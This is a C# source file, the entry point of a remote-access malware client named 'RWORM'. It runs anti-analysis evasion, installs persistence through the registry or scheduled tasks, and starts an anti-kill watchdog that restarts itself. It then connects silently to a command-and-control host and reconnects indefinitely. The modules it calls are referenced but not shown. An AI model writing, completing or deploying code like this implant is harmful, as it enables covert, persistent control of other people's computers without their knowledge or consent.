using System;
using System.Threading;
using System.Threading.Tasks;
using RWORM.Client.Core;
using RWORM.Client.Modules;
using RWORM.Client.Network;

namespace RWORM.Client
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            // If launched in supervisor / watchdog role, run monitoring loop
            if (args.Length >= 3 && (args[0] == "--watchdog" || args[0] == "--supervisor"))
            {
                Watchdog.RunWatchdogMode(args);
                return;
            }

            // Evasion / Anti-Analysis checks
            Evasion.Run();

            // Persistence installation (Registry / Scheduled Tasks)
            Persistence.Install();

            // Initialize self-healing supervisor watchdog if AntiKill is enabled
            Watchdog.InitializeWatchdog();

            // No-console: WinExe entry point, no Console.* calls.
            var connector = new Connector();

            // Keep process alive; reconnect loop runs inside Connector.
            using var exitEvent = new ManualResetEventSlim(false);

            connector.ConnectAsync(Config.C2Host, Config.C2Port)
                     .ContinueWith(t =>
                     {
                         // ConnectAsync failed fatally — wait then retry handled inside
                     });

            exitEvent.Wait(); // block forever; Connector manages reconnect internally
        }
    }
}
